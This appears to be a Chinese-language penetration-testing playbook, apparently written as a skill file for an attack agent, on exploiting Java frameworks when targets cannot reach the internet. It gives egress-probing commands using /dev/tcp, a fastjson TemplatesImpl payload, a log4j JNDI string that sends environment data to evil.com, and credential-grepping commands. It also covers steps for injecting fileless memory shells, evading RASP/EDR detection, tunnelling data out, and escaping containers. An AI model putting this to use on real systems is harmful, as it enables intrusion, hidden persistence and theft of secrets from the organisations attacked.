---
description: 不出网场景下的漏洞利用、回显技术和内存马注入。当目标不出网（无法反弹shell、DNSLOG无回显、ICMP被禁）时使用。覆盖Shiro/fastjson/log4j/Spring等框架的不出网利用链。
---

# 不出网利用与内存马注入

## 核心原则

==不出网 = 目标无法主动连接外部（出站规则白名单/单向防火墙/HTTP 代理无外网权限）。此时常规反弹 shell、DNSLOG 回显、JNDI 注入全部失效。必须换思路。==

> 前置: 反序列化漏洞利用参考 @web-exploit.md；获取 shell 后的后利用参考 @post-exploit.md。

## 第一步：确认不出网类型

```
不出网分几种情况，先判断再选策略：

情况 A: 完全不出网（ping 不通外网 DNS，curl 外网无响应）
  → 只能用时间延迟回显 / 写入文件后读取 / 内存马

情况 B: 仅 DNS 出网（curl 不通但 nslookup 能解析）
  → DNS 隧道回显（dnscat2 / iodine / 自定义 DNS 查询）

情况 C: 仅 ICMP 出网（ping 通外网，但无 TCP 连接）
  → ICMP 隧道回显

情况 D: 有 HTTP 代理但无直接外网（内网 HTTP 代理可达外网）
  → HTTP 隧道 / 通过代理反弹

情况 E: 出站端口白名单（仅 80/443/8080 可达外网）
  → 端口复用 / 伪装 HTTP 流量
```

### 快速判断脚本

```bash
# 1. DNS 出网测试
nslookup your-server.com 2>/dev/null && echo "[DNS] 出网"
dig @8.8.8.8 your-server.com 2>/dev/null && echo "[DNS直连] 出网"

# 2. HTTP 出网测试
curl -s --connect-timeout 3 http://your-server.com:80/check && echo "[HTTP:80] 出网"
curl -s --connect-timeout 3 https://your-server.com:443/check && echo "[HTTPS:443] 出网"

# 3. ICMP 出网测试
ping -c 2 -W 2 your-server.com && echo "[ICMP] 出网"

# 4. 非标端口出网测试
curl -s --connect-timeout 3 http://your-server.com:8080/check && echo "[HTTP:8080] 出网"
curl -s --connect-timeout 3 http://your-server.com:53/check && echo "[HTTP:53] 出网"

# 5. TCP 直接出网测试
timeout 2 bash -c "echo >/dev/tcp/your-server.com/4444" 2>/dev/null && echo "[TCP:4444] 出网"
```

---

## 场景 A：Java 反序列化不出网利用

==Shiro/fastjson/log4j 不出网时的核心问题：没有回显通道 + 不能反弹 shell。==

### A1. Shiro 不出网利用

```
Shiro RememberMe 反序列化的特点:
  - Cookie 中的 rememberMe 字段触发，请求→响应通道存在
  - 不出网时不能用 JNDI/ldap/rmi 远程加载 class
  - 但可以用「回显链」——在反序列化 payload 中直接嵌入回显逻辑

利用链选择:
  有 Commons-Collections (CC链):
    CC1-CC7 均可尝试（常用 CC2/CC4/CC6）
    关键: 用 TemplatesImpl 加载字节码，直接在内存中执行回显

  有 Commons-BeanUtils (CB链):
    CB1 链 → TemplatesImpl

  无依赖（Shiro 自带）:
    Shiro 550 默认 key 尝试 → 一把梭

不出网回显方式:
  1. 命令执行结果写入 web 目录静态文件 → curl 读取
  2. 命令执行结果写入 Response Header（Tomcat 回显链）
  3. 命令执行结果通过时间延迟逐比特外传（最慢但最可靠）
```

**Tomcat 回显链（最常用，Shiro 不出网首选）：**

```
原理: 在反序列化 payload 中获取当前请求的 Response 对象，
     将命令执行结果直接写入 HTTP Response Header 或 Body。

关键步骤:
  1. 通过 ThreadLocal → RequestContext → Request/Response
  2. 构造特殊 header（如 Cmd: <result>）
  3. 客户端在响应中直接看到命令结果

工具: java-deserialization-burp-suite 或 ysoserial 的回显修改版
```

**时间延迟回显（终极兜底，Read >2 bytes/s）：**

```
原理: 命令执行后逐字符读取，每个字符通过 sleep() 时长编码。
     例如 'A'=65 → sleep(650ms)，客户端测量实际延迟时间 → 还原字符。

适用: 完全不出网且无回显通道时（最后手段）

实现示例:
  char = read_byte(cmd_result, position)
  sleep(char * 10)  # 'A'(65) → 650ms

客户端: 测量每个请求的响应时间 → 除以 10 → 得到 ASCII 码
速度: 约 2-3 字符/秒（取决于网络延迟稳定性）
```

### A2. fastjson 不出网利用

```
fastjson 反序列化的特点:
  - JSON 输入 → 触发 getter/setter/构造函数
  - 通常用 JNDI 注入（ldap:// 或 rmi://）远程加载恶意类
  - 不出网时 JNDI 不可用，需要用 TemplatesImpl 本地加载

利用链:
  fastjson <= 1.2.24:
    type: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
    配合 _bytecodes 字段直接传入恶意 class 字节码（base64 编码）
    → 在本地实例化恶意类，无需外连

  fastjson 1.2.25-1.2.47:
    需要开启 autoType（默认关），或有其他 gadget 链
    → 用 JdbcRowSetImpl + 本地 dataSourceName → 但需要 JNDI

  fastjson 1.2.48+:
    默认关闭 autoType，黑名单不断更新
    → 需要挖掘新的 autoType 绕过链

TemplatesImpl 利用（fastjson 不出网首选）:
  {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["<base64_encoded_malicious_class>"],
    "_name": "a",
    "_tfactory": {},
    "_outputProperties": {}
  }
```

### A3. log4j 不出网利用

```
log4j JNDI 注入的特点:
  - 日志输入中的 ${jndi:ldap://evil/class} 触发 JNDI 查找
  - 不出网时 ldap/ldaps/rmi/dns 全部不工作
  - 2.15+ 默认禁用 JNDI，但其他 lookup 可能可用

不出网替代方案:
  1. ${env:HOSTNAME} → 获取环境变量（可能泄露内网域名）
  2. ${sys:java.version} → 获取 Java 版本
  3. ${java:runtime} → 获取运行时信息（有限泄露）
  4. 如果目标有出站的 DNS（情况B）→ ${jndi:dns://evil.com/${env:USER}}
  5. 如果目标是 log4j 2.x （2.15 之前且无 TrustURLCodebase 限制）→ 拼一把 JNDI

log4j 2.17.0+:
  完全禁用 lookup，无利用可能 → 检查其他漏洞
```

---

## 场景 B：内存马注入（不出网环境）

==不出网时，内存马是最重要的持久化手段：无文件落地、无日志痕迹、不过杀软。==

### B1. Java 内存马类型选择

```
Filter 型（推荐首选）:
  优点: 拦截所有请求，优先级高，稳定
  缺点: filterConfig 可能为 null 导致 NPE（需处理）
  注入点: ApplicationContext → StandardContext → filterDefs + filterMaps

Servlet 型:
  优点: 简单直接
  缺点: Servlet 路径固定，需知道访问路径
  注入点: StandardContext → children → StandardWrapper

Listener 型:
  优点: 无需路径，随应用启动触发
  缺点: 只在特定事件触发
  注入点: StandardContext → applicationEventListeners

Valve 型:
  优点: 比 Filter 更底层，在 Filter 链之前执行
  缺点: Tomcat 版本间 API 可能不同
  注入点: StandardPipeline → addValve

WebSocket 型:
  优点: 全双工通道，可以维持长连接（突破不出网限制的一次性机会）
  缺点: 需要目标应用使用 WebSocket
  注入点: ServerContainer → addEndpoint
```

### B2. 内存马注入工具与方法

```
不出网注入手段（按可行性排序）:

1. 反序列化漏洞 → 直接加载内存马 class（最简单）
   - Shiro RememberMe → TemplatesImpl → 加载 Filter/Servlet 内存马
   - fastjson → TemplatesImpl → 加载内存马
   - WebLogic T3/IIOP → 反序列化 → 注入内存马

2. JNDI 高版本绕过（JDK 11.0.1+/8u191+）:
   - 本地 classpath 中有可利用的 gadget 链
   - 用 BeanFactory + EL 表达式绕过 TrustURLCodebase 限制
   - 需要目标 classpath 有 tomcat-el-api 或 groovy

3. 文件上传 → 访问 JSP → JSP 注入内存马（一次性）
   - 上传 JSP 文件 → 访问 JSP → JSP 代码注入 Filter/Servlet
   - JSP 执行完后可以自删（无文件）

4. 反序列化 → 写入 JSP → 访问 → 注入内存马 → 删 JSP
   - 两步走：先落地 JSP，访问后注入内存马，删除 JSP
   - 适用于反序列化 payload 太复杂无法直接在内存中组装的情况

5. JDBC Connection URL 注入（特殊场景）:
   - 如果可控 JDBC URL → mysql://→ 用 fake MySQL server 返回恶意反序列化数据
   - PostgreSQL JDBC → socketFactory 参数 → 远程加载类（但需要出网）
```

### B3. 内存马检测与规避

```
RASP/EDR 检测内存马的常见方式:
  - 检测 StandardContext 中新增的 filter/servlet
  - 检测 classloader 中动态加载的可疑 class
  - 检测 JVM 中非磁盘来源的 class（Instrumentation API）

规避方法:
  1. 用已有 classloader 加载（不要新建）
  2. 注入到已有 filter 的链中（新增但伪装成已有）
  3. 修改已有 filter 的 doFilter 逻辑（更难检测——不改结构，改行为）
  4. 使用 Agent 型内存马（Java Agent 级别，比 Filter 更难检测）
  5. 选择不常见的注入位置（如 Tomcat 的 AccessLogValve、ErrorReportValve）
```

### B4. Agent 型内存马（高级）

```
Java Agent 内存马:
  - 通过 Attach API 注入 agent.jar
  - 或者通过 VirtualMachine.attach() 动态 attach
  - Agent 可以拦截所有 class 加载 → 修改任何类的字节码
  - 比 Filter/Servlet 内存马隐蔽得多（没有标准 API 可以列举 agents）

注入前提:
  1. 目标 JVM 启用了 Attach API（默认启用）
  2. 攻击者进程与目标 JVM 同用户（或 root）
  3. 需要落地 agent.jar 文件（或者 /tmp 内存映射）

不出网环境限制:
  - 不能远程下载 agent.jar
  - 需要反序列化 → 写入 agent.jar 到本地 → 执行 attach
  - 或者通过 webshell 直接构造 agent jar（纯 base64 解码→写入）
```

---

## 场景 C：不出网时的情报收集

==不出网不代表没法收集信息。先搞清楚自己在哪，再规划下一步。==

```bash
# 能写到文件 + 能读到文件 → 所有信息都能收集
# 能写到文件 + 不能直接读 → 时间盲注逐比特读
# 不能写文件 → 内存马注入后收集
# 全部不能 → DNS 隧道侧信道（如果 DNS 出网）

# 优先收集:
hostname; whoami; uname -a; ip addr; ip route
# 内网信息:
arp -a; cat /etc/hosts; cat /etc/resolv.conf
# 环境变量（可能含代理/云凭证）:
env | grep -iE "proxy|password|secret|key|token|k8s|docker"
# 进程列表（判断有哪些安全软件）:
ps aux --no-headers 2>/dev/null || ps aux 2>/dev/null
# Java 进程:
jps -l 2>/dev/null || ps aux | grep java
```

---

## 场景 D：尝试突破不出网

==不出网可能是网络配置问题，也可能是安全策略。尝试以下路径：==

### D1. 端口复用/隧道突破

```
1. HTTP 隧道（如果 80/443 可达外网）:
   - reGeorg / Neo-reGeorg: 上传隧道脚本 → 通过 HTTP 代理出网
   - ABPTTS: 加密的 HTTP 隧道
   - tunna: HTTP 隧道封装 TCP

2. WebSocket 隧道（如果 WebSocket 可达外网）:
   - 利用 WebSocket 全双工特性转发流量
   - 无需额外的隧道脚本（复用已有的 WebSocket 连接）

3. DNS 隧道（如果 DNS 出网）:
   - dnscat2 / iodine
   - 速度慢（~2KB/s）但能通
   - 携带文件泄露信息足够了，反弹 shell 体验差
   - > 隧道建立后的实际数据外传流程（加密/分片/反DLP）→ @post-exploit.md「场景 O：数据外传」

4. ICMP 隧道（如果 ICMP 出网）:
   - ptunnel / icmpsh
   - 比 DNS 隧道快，但防火墙常见过滤 ICMP payload
   - > 数据外传通道选择 → @post-exploit.md「场景 O4：ICMP 隧道」

5. SSH 隧道（如果 SSH 22 出站）:
   - ssh -D 1080 -N user@pivot → SOCKS
   - ssh -R 4444:localhost:22 user@pivot → 反向端口转发（pivot 能连回来）

6. NTP 隧道:
   - 极隐蔽但极慢
   - 利用 NTP 协议的 monlist 等字段携带数据
```

### D2. 内网代理链

```
如果目标完全不出网但内网有其他机器可以出网:
  1. 扫内网存活 → 找一台有外网权限的主机
  2. 横向移动到那台机器
  3. 从那台机器建立出网通道
  4. 通过内网路由把不出网主机的流量转发出去

内网发现（ping/arp/端口扫描）→ 横向移动 → 代理链:

不出网主机 ──[内网]──→ 可出网主机 ──[frp/reGeorg]──→ C2
```

### D3. 边界设备探测

```
不出网可能是因为:
  1. 防火墙规则（Linux iptables / Windows Firewall）
     → iptables -L -n; netsh advfirewall show allprofiles

  2. 安全组（云环境）
     → 如果是云环境，AK/SK 可以改安全组规则

  3. HTTP 代理（没有直接出网，但可能有 HTTP_PROXY）
     → env | grep -i proxy; cat /etc/profile; cat ~/.bashrc

  4. DNS 劫持/内网 DNS
     → 尝试直接使用外网 DNS（dig @8.8.8.8）

  5. 主机防火墙（iptables OUTPUT chain DROP）
     → iptables -L OUTPUT -n
     → 如果有 root → 可以自己加规则放行
```

---

## 各框架不出网利用链速查表

### Shiro

| 版本 | 不出网利用链 | 回显方式 |
|------|------------|---------|
| Shiro < 1.2.4 (key已知) | Commons-Collections + TemplatesImpl | Tomcat 回显链 |
| Shiro 1.2.4-1.7.0 | Commons-BeanUtils + TemplatesImpl | Tomcat 回显链 |
| Shiro 1.7.0+ | 无 Commons 依赖 → 需要目标有 cc/cb 库 | Tomcat 回显链 |
| Shiro 1.10.0+ | padding oracle 攻击 key 泄漏 → 同上 | Tomcat 回显链 |

### fastjson

| 版本 | 不出网利用链 | 回显方式 |
|------|------------|---------|
| <= 1.2.24 | TemplatesImpl `_bytecodes` | 写入静态文件/header回显 |
| 1.2.25-1.2.47 | 需 autoType=true + TemplatesImpl | 同上 |
| 1.2.48-1.2.68 | mappings 绕过 + JndiConverter (需出DNS) | DNS外带优先 |
| 1.2.68+ | blacklist 完整, 需挖掘新的 autoType 绕过 | — |

### log4j

| 版本 | 不出网利用 | 回显方式 |
|------|----------|---------|
| 2.0-2.14.1 (JDK < 8u191) | JNDI ldap (需出网) | — |
| 2.0-2.14.1 (JDK >= 8u191) | 无法远程加载 class | ${env:}/${sys:} 信息泄露 |
| 2.15 | 默认禁用 lookup (可选开启) | 如开启 → 同 2.14 |
| 2.16-2.17 | 完全禁用 JNDI | 无 RCE |
| 2.17.0+ | 完全修复 | — |

### WebLogic

| 版本 | 不出网利用 | 回显方式 |
|------|----------|---------|
| 10.3.6.0 | CVE-2020-2555 (T3) + TemplatesImpl | WebLogic 回显链 |
| 12.1.3.0 | CVE-2020-14882 (console 未授权) | 直接 console 执行命令 |
| 12.2.1.3+ | CVE-2023-21839 (T3/IIOP) | WebLogic 回显链 |

### Spring Boot

| 场景 | 不出网利用 | 回显方式 |
|------|----------|---------|
| Actuator env 可写 | POST /actuator/env → 修改配置 → /actuator/refresh → RCE | 执行命令 |
| Actuator jolokia | CVE-2018-1260 / CVE-2018-1261 → RCE | HTTP 响应直接回显 |
| Eureka 未授权 | REST API 写配置 → refresh → RCE | 执行命令 |
| Spring Cloud Gateway | 创建恶意 route → refresh → RCE | HTTP 响应回显 |

---

## 走不通时的替代方案

```
完全不出网 + 无回显 + 内存马注入失败？

├── 用时间盲注逐字节读取（能执行命令但看不到输出时）
├── 写 webshell 落地文件（内存马不行就落地，先拿到 webshell 再说）
├── 检查是否有 RMI/JMX 端口（本地 RMI 调用可能不经过防火墙）
├── 检查是否有其他内网应用可达（数据库、Redis、内网 Web）
├── 提权后修改防火墙规则（root 可以改 iptables / 安全组）
├── Docker 容器内 → 检查是否能访问宿主机 /var/run/docker.sock
├── K8s Pod 内 → 用 ServiceAccount token 调 K8s API 创建特权 Pod
└── 确认真的没办法 → 不要死磕，扩大攻击面找其他入口
```

## 知识库路由

| 场景 | KB 路径 | 关键内容 |
|------|---------|---------|
| 不出网利用 | `04-后渗透/不出网利用.md` | DNS隧道/ICMP/HTTP代理 |
| 内存马技术 | KB `03-漏洞利用/组件漏洞/` + skills 目录 | Java/PHP 内存马 |
| Shiro 漏洞 | `03-漏洞利用/组件漏洞/` | RememberMe 反序列化 |
| fastjson 漏洞 | `03-漏洞利用/组件漏洞/` | fastjson 各版本利用 |
| log4j 漏洞 | `03-漏洞利用/组件漏洞/` | log4j RCE |